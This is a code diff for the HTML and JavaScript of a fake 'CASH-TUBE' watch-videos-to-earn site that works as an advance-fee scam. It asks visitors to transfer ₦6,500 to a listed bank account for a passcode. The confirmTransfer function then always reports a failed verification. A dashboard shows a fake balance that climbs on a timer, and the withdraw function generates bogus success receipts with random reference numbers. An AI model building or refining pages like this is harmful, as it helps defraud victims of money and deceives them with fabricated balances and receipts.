@@ -920,7 +920,7 @@ button:active { transform: scale(0.96); }
                 <path d="M20 16C20 16 22 14 24 14C26 14 28 16 28 16" stroke="white" stroke-width="2" stroke-linecap="round"/>
                 <circle cx="14" cy="12" r="3" fill="white"/>
                 <circle cx="26" cy="12" r="3" fill="white"/>
-                <text x="12" y="11" font-size="6" fill="#ff1493" font-weight="bold">▶️</text>
+                <text x="12" y="11" font-size="6" fill="#ff1493" font-weight="bold">▶</text>
                 <text x="24" y="11" font-size="6" fill="#ff1493" font-weight="bold">$</text>
                 <path d="M14 26C14 26 17 29 20 29C23 29 26 26 26 26" stroke="white" stroke-width="2" stroke-linecap="round"/>
             </svg>
@@ -971,4 +971,528 @@ button:active { transform: scale(0.96); }
 
 <!-- PAGE 2 - SIGNUP -->
 <div id="page2" class="page">
-    <div class="container" style="max-width:100%; margin:0; borde
+    <div class="container" style="max-width:100%; margin:0; border-radius:0; padding:25px 20px;">
+        <h2 style="color:#6a00ff; font-size:26px; text-align:center; margin-bottom:15px;">Buy Your Passcode</h2>
+
+        <p style="color:#333; font-size:15px; line-height:1.6; margin-bottom:25px;">
+            Fill in your details. Your <span style="color:#ff1493; font-weight:bold;">CASH-TUBE</span> passcode will be reviewed and sent to you as soon as your payment is confirmed.
+        </p>
+
+        <label style="display:block; font-weight:bold; color:#333; margin-bottom:8px; font-size:16px;">Full Name:</label>
+        <input type="text" id="name" placeholder="" style="margin-bottom:20px;">
+
+        <label style="display:block; font-weight:bold; color:#333; margin-bottom:8px; font-size:16px;">Phone Number:</label>
+        <input type="number" id="phone" placeholder="" style="margin-bottom:20px;">
+
+        <label style="display:block; font-weight:bold; color:#333; margin-bottom:8px; font-size:16px;">Amount:</label>
+        <input type="text" value="₦6,500" readonly style="background:#f5f5f5; color:#999; margin-bottom:25px;">
+
+        <button class="btn" onclick="goPayment()" style="background:#6a00ff; font-size:18px; padding:18px;">Proceed to Payment</button>
+
+        <div class="note" style="border-left:4px solid #6a00ff; background:#f8f0ff; padding:20px; margin-top:25px; border-radius:10px;">
+            <p style="margin:0 0 10px 0; color:#333; font-size:15px; line-height:1.6;">
+                <b>Note:</b> You must make a payment of <span style="color:#ff1493; font-weight:bold;">₦6,500</span> to gain full access to the <span style="color:#ff1493; font-weight:bold;">CASH-TUBE</span> video earning app.
+            </p>
+            <p style="margin:0; color:#333; font-size:15px; line-height:1.6;">
+                You can withdraw your ₦6,500 immediately after accessing your dashboard.
+            </p>
+        </div>
+    </div>
+
+    <!-- Bottom Nav for Page 2 -->
+    <div style="position:fixed; bottom:0; left:0; right:0; background:#6a00ff; display:flex; justify-content:space-around; padding:15px 0; z-index:100;">
+        <a href="#" onclick="showPage('page1'); return false;" style="color:white; text-decoration:none; font-weight:bold; font-size:16px;">Home</a>
+        <a href="#" onclick="openContact(); return false;" style="color:white; text-decoration:none; font-weight:bold; font-size:16px;">Help</a>
+        <a href="#" style="color:white; text-decoration:none; font-weight:bold; font-size:16px;">Privacy</a>
+    </div>
+</div>
+
+<!-- PAGE 3 - PAYMENT -->
+<div id="page3" class="page">
+    <div style="background:#2d2f5b; color:white; padding:20px; text-align:center;">
+        <h2 style="margin:0; font-size:22px;">CashTube Payment Portal</h2>
+    </div>
+
+    <div class="card" style="margin:30px 20px; padding:30px 25px;">
+        <h3 style="color:#2d2f5b; font-size:22px; text-align:center; margin-bottom:30px;">Pay ₦6,500 to Access Your Dashboard</h3>
+
+        <label style="display:block; color:#333; margin-bottom:8px; font-size:15px;">Amount</label>
+        <input type="text" value="₦6,500" readonly style="background:#f5f5f5; color:#2d2f5b; font-weight:bold; font-size:18px; margin-bottom:20px;">
+
+        <label style="display:block; color:#333; margin-bottom:8px; font-size:15px;">Full Name</label>
+        <input type="text" id="fullname" placeholder="Enter your full name" style="margin-bottom:20px;">
+
+        <label style="display:block; color:#333; margin-bottom:8px; font-size:15px;">Email Address</label>
+        <input type="email" id="email" placeholder="you@example.com" style="margin-bottom:25px;">
+
+        <button class="btn" onclick="payNow()" style="background:#2d2f5b; font-size:18px; padding:18px;">Proceed to Payment</button>
+
+        <div style="text-align:center; margin-top:25px;">
+            <p style="color:#999; font-size:13px; margin:0;">Powered by <span style="color:#ff6b35; font-weight:bold;">flutterwave</span></p>
+        </div>
+    </div>
+</div>
+
+<!-- PAGE 5 - BANK TRANSFER -->
+<div id="page5" class="page">
+    <div class="topbar">
+        <span>Bank Transfer</span>
+        <span style="color:red;" onclick="showPage('page3')">Cancel</span>
+    </div>
+    <div class="transferBox">
+        <h2>NGN 6,500</h2>
+        <p id="transferEmail"></p>
+        <p>Proceed to your bank app to complete this transfer.</p>
+        <hr>
+        <div class="row">
+            <span>Amount</span>
+            <span><b>NGN 6,500</b></span>
+        </div>
+        <div class="row">
+            <span>Account Number</span>
+            <span class="copy" onclick="copyText('9736975047')">9736975047</span>
+        </div>
+        <div class="row">
+            <span>Bank</span>
+            <span>Paystack Titan</span>
+        </div>
+        <div class="row">
+            <span>Account Name</span>
+            <span>KA | TS AGENT</span>
+        </div>
+        <div class="warning">
+            WARNING: Do NOT use Opay and Kuda for this transfer.
+        </div>
+        <button class="payBtn" onclick="confirmTransfer(event)">
+            I have made this Transfer
+        </button>
+    </div>
+</div>
+
+<!-- PAGE 4 - PAYMENT SUCCESS -->
+<div id="page4" class="page">
+    <div class="header">Payment Status</div>
+    <div class="card">
+        <h2 style="color:green;">✔ Payment Successful</h2>
+        <p>Your account has been activated.</p>
+        <button class="btn" onclick="goDashboard()">Continue</button>
+    </div>
+</div>
+
+<!-- PAGE 6 - PAYMENT FAILED -->
+<div id="page6" class="page">
+    <div class="topbar">
+        <span>Bank Transfer</span>
+        <span style="color:red;" onclick="showPage('page3')">Cancel</span>
+    </div>
+    <div class="transferBox">
+        <h2>NGN 6,500</h2>
+        <p id="failEmail"></p>
+        <p>Proceed to your bank app to complete this transfer.</p>
+        <hr>
+        <h3 style="color:red;">Transaction verification failed!</h3>
+        <p>Your payment could not be completed.</p>
+        <p>Reason: Unable to validate account / invalid mobile money account.</p>
+        <button class="btn" style="background:#ccc; color:black;">
+            Access code unavailable
+        </button>
+    </div>
+</div>
+
+<!-- PAGE 7 - DASHBOARD -->
+<div id="page7" class="page">
+    <div class="dashboard-header">
+        <div class="user-info">
+            <div class="user-avatar">👤</div>
+            <div class="user-greeting">
+                <h2>Hello, Valid User</h2>
+                <p>Good Day.</p>
+            </div>
+        </div>
+        <button class="toggle-btn" onclick="toggleLightMode()">Toggle Light Mode</button>
+    </div>
+
+    <div class="balance-card">
+        <p>Available Balance</p>
+        <h1 id="balanceDisplay">₦ 6,500</h1>
+    </div>
+
+    <div class="earn-section" id="earnSection">
+        <h2>Watch Videos to Earn Money</h2>
+        <div class="video-container" id="videoContainer">
+            <video id="adVideo" controls autoplay muted playsinline>
+                <source src="https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/ForBiggerBlazes.mp4" type="video/mp4">
+            </video>
+        </div>
+        <p class="earn-hint">
+            The more videos you watch, the more your <span>available balance</span> increases
+        </p>
+    </div>
+
+    <!-- WITHDRAW FORM - Now part of dashboard page -->
+    <div class="withdraw-section" id="withdrawSection">
+        <div class="withdraw-form">
+            <input type="text" id="withdrawAccNum" class="dark-input" placeholder="Account Number">
+            <input type="text" id="withdrawAccName" class="dark-input" placeholder="Account Name">
+            <input type="text" id="withdrawBank" class="dark-input" placeholder="Bank Name">
+            <input type="number" id="withdrawAmount" class="dark-input" placeholder="Amount">
+
+            <button class="withdraw-btn" onclick="processWithdraw()">Withdraw</button>
+
+            <div style="text-align: center; margin-top: 20px;">
+                <button class="crypto-btn">
+                    <span class="crypto-icon">›</span>
+                    <span>Crypto</span>
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <div class="bottom-nav">
+        <div class="nav-item active" onclick="showNav('home')">
+            <span>🏠</span>
+            <span>Home</span>
+        </div>
+        <div class="nav-item" onclick="showNav('profile')">
+            <span>👤</span>
+            <span>Profile</span>
+        </div>
+        <div class="nav-item" onclick="showNav('history')">
+            <span>📜</span>
+            <span>History</span>
+        </div>
+        <div class="nav-item" onclick="showNav('support')">
+            <span>🎧</span>
+            <span>Support</span>
+        </div>
+    </div>
+</div>
+
+
+
+<!-- PAGE 9 - RECEIPT -->
+<div id="page9" class="page">
+    <div class="receipt-container">
+        <div class="receipt-check">✓</div>
+        <h2 class="receipt-title">PAYMENT SUCCESS!</h2>
+        <h1 class="receipt-amount" id="receiptAmount">₦ 0</h1>
+
+        <div class="receipt-card">
+            <h3>Payment Details</h3>
+            <div class="receipt-row">
+                <span>Ref Number</span>
+                <span id="receiptRef">26717023</span>
+            </div>
+            <div class="receipt-row">
+                <span>Payment Time</span>
+                <span id="receiptTime">May 1, 2026 9:50 AM</span>
+            </div>
+            <div class="receipt-row">
+                <span>Account Name</span>
+                <span id="receiptAccName">JOHN</span>
+            </div>
+            <div class="receipt-row">
+                <span>Account Number</span>
+                <span id="receiptAccNum">7053661549</span>
+            </div>
+            <div class="receipt-row">
+                <span>Bank Name</span>
+                <span id="receiptBank">OPAY</span>
+            </div>
+            <div class="receipt-row">
+                <span>From</span>
+                <span>Cash Tube</span>
+            </div>
+            <div class="receipt-row">
+                <span>Payment Status</span>
+                <span style="color: #22c55e;">Success</span>
+            </div>
+        </div>
+
+        <button class="back-home-btn" onclick="showPage('page7')">Back to Home</button>
+    </div>
+</div>
+
+<!-- Toast -->
+<div class="toast" id="toast"></div>
+
+<script>
+// ========== GLOBAL STATE ==========
+let currentBalance = 6500;
+const MAX_BALANCE = 900000;
+const INCREMENT_AMOUNT = 3000;
+const INCREMENT_INTERVAL = 6000;
+let balanceInterval = null;
+let touchStartY = 0;
+let isLightMode = false;
+
+
+
+// ========== PAGE NAVIGATION ==========
+showPage("page1");
+
+function showPage(id) {
+    document.querySelectorAll(".page").forEach(p => p.style.display = "none");
+    document.getElementById(id).style.display = "block";
+    window.scrollTo(0, 0);
+
+    // Start balance increment when on dashboard
+    if (id === 'page7') {
+        startBalanceIncrement();
+    } else {
+        stopBalanceIncrement();
+    }
+
+    // Randomize video when entering dashboard
+    if (id === 'page7') {
+        randomizeVideo();
+    }
+}
+
+// ========== MENU ==========
+function toggleMenu() {
+    const dropdown = document.getElementById("menuDropdown");
+    const backdrop = document.getElementById("backdrop");
+
+    if (dropdown.classList.contains("active")) {
+        closeMenu();
+    } else {
+        dropdown.classList.add("active");
+        backdrop.classList.add("active");
+    }
+}
+
+function closeMenu() {
+    document.getElementById("menuDropdown").classList.remove("active");
+    document.getElementById("backdrop").classList.remove("active");
+}
+
+function openContact() {
+    closeMenu();
+    document.getElementById("contactOverlay").classList.add("active");
+    document.body.style.overflow = "hidden";
+}
+
+function closeContact() {
+    document.getElementById("contactOverlay").classList.remove("active");
+    document.body.style.overflow = "auto";
+}
+
+// ========== LOGIN / KEYPAD ==========
+function addNum(num) {
+    let input = document.getElementById("codeInput");
+    if (input.value.length < 5) input.value += num;
+}
+
+function clearInput() {
+    document.getElementById("codeInput").value = "";
+}
+
+function login() {
+    const code = document.getElementById("codeInput").value;
+    if (code === "23568") {
+        document.getElementById("loginModal").classList.add("active");
+    } else {
+        showSignupPrompt();
+    }
+}
+
+function showSignupPrompt() {
+    document.getElementById("signupPromptModal").classList.add("active");
+}
+
+function goSignup() {
+    showPage("page2");
+}
+
+// ========== DASHBOARD ==========
+function closeSignupPrompt() {
+    document.getElementById("signupPromptModal").classList.remove("active");
+}
+
+function goDashboard() {
+    document.getElementById("loginModal").classList.remove("active");
+    showPage("page7");
+}
+
+function startBalanceIncrement() {
+    if (balanceInterval) clearInterval(balanceInterval);
+    balanceInterval = setInterval(() => {
+        if (currentBalance < MAX_BALANCE) {
+            currentBalance += 5000;
+            if (currentBalance > MAX_BALANCE) currentBalance = MAX_BALANCE;
+            updateBalanceDisplay();
+        } else {
+            stopBalanceIncrement();
+        }
+    }, 3000);
+}
+
+function stopBalanceIncrement() {
+    if (balanceInterval) {
+        clearInterval(balanceInterval);
+        balanceInterval = null;
+    }
+}
+
+function updateBalanceDisplay() {
+    const display = document.getElementById("balanceDisplay");
+    if (display) {
+        display.textContent = "₦ " + currentBalance.toLocaleString();
+    }
+}
+
+function randomizeVideo() {
+    const video = document.getElementById("adVideo");
+    const randomUrl = adVideos[Math.floor(Math.random() * adVideos.length)];
+    video.src = randomUrl;
+    video.load();
+    video.play().catch(e => console.log("Autoplay prevented"));
+}
+
+
+
+// ========== LIGHT MODE TOGGLE ==========
+function toggleLightMode() {
+    isLightMode = !isLightMode;
+    const page7 = document.getElementById("page7");
+    const page8 = document.getElementById("page8");
+
+    if (isLightMode) {
+        page7.style.background = "#f1f5f9";
+        page8.style.background = "#f1f5f9";
+        document.querySelectorAll("#page7 .dashboard-header, #page7 .earn-section h2").forEach(el => {
+            el.style.color = "#1e293b";
+        });
+        document.querySelectorAll("#page7 .user-greeting p").forEach(el => {
+            el.style.color = "#64748b";
+        });
+        document.querySelectorAll("#page7 .earn-hint").forEach(el => {
+            el.style.color = "#64748b";
+        });
+    } else {
+        page7.style.background = "#1e293b";
+        page8.style.background = "#1e293b";
+        document.querySelectorAll("#page7 .dashboard-header, #page7 .earn-section h2").forEach(el => {
+            el.style.color = "white";
+        });
+        document.querySelectorAll("#page7 .user-greeting p").forEach(el => {
+            el.style.color = "#94a3b8";
+        });
+        document.querySelectorAll("#page7 .earn-hint").forEach(el => {
+            el.style.color = "#94a3b8";
+        });
+    }
+}
+
+// ========== BOTTOM NAV ==========
+function showNav(tab) {
+    document.querySelectorAll(".nav-item").forEach(item => item.classList.remove("active"));
+    event.target.closest(".nav-item").classList.add("active");
+
+    if (tab === 'home') {
+        showPage('page7');
+        window.scrollTo({ top: 0, behavior: 'smooth' });
+    }
+    if (tab === 'profile') showToast("Profile coming soon!");
+    if (tab === 'history') showToast("History coming soon!");
+    if (tab === 'support') openContact();
+}
+
+// ========== WITHDRAW ==========
+function processWithdraw() {
+    const accNum = document.getElementById("withdrawAccNum").value;
+    const accName = document.getElementById("withdrawAccName").value;
+    const bank = document.getElementById("withdrawBank").value;
+    const amount = document.getElementById("withdrawAmount").value;
+
+    if (!accNum || !accName || !bank || !amount) {
+        showToast("Fill all details!");
+        return;
+    }
+
+    if (parseInt(amount) > currentBalance) {
+        showToast("Insufficient balance!");
+        return;
+    }
+
+    // Update receipt
+    document.getElementById("receiptAmount").textContent = "₦ " + parseInt(amount).toLocaleString();
+    document.getElementById("receiptAccName").textContent = accName.toUpperCase();
+    document.getElementById("receiptAccNum").textContent = accNum;
+    document.getElementById("receiptBank").textContent = bank.toUpperCase();
+    document.getElementById("receiptRef").textContent = Math.floor(10000000 + Math.random() * 90000000);
+
+    const now = new Date();
+    const timeStr = now.toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' }) + 
+                    " " + now.toLocaleTimeString('en-US', { hour: 'numeric', minute: '2-digit' });
+    document.getElementById("receiptTime").textContent = timeStr;
+
+    // Deduct from balance
+    currentBalance -= parseInt(amount);
+    updateBalanceDisplay();
+
+    showPage("page9");
+}
+
+// ========== PAYMENT FLOW ==========
+function goPayment() {
+    let name = document.getElementById("name").value;
+    let phone = document.getElementById("phone").value;
+
+    if (!name || !phone) {
+        alert("Fill all details!");
+        return;
+    }
+
+    document.getElementById("fullname").value = name;
+    showPage("page3");
+}
+
+function payNow() {
+    let email = document.getElementById("email").value;
+
+    if (!email) {
+        alert("Enter email!");
+        return;
+    }
+
+    document.getElementById("transferEmail").innerText = email;
+    showPage("page5");
+}
+
+function confirmTransfer(event) {
+    let btn = event.target;
+    btn.innerText = "Verifying...";
+    btn.disabled = true;
+
+    setTimeout(() => {
+        document.getElementById("failEmail").innerText =
+            document.getElementById("transferEmail").innerText;
+
+        showPage("page6");
+
+        btn.innerText = "I have made this Transfer";
+        btn.disabled = false;
+    }, 6000);
+}
+
+function copyText(text) {
+    navigator.clipboard.writeText(text).then(() => {
+        showToast("Copied: " + text);
+    });
+}
+
+// ========== TOAST ==========
+function showToast(message) {
+    const toast = document.getElementById("toast");
+    toast.textContent = message;
+    toast.classList.add("show");
+    setTimeout(() => {
+        toast.classList.remove("show");
+    }, 2500);
+}
+</script>
+
+</body>
+</html>
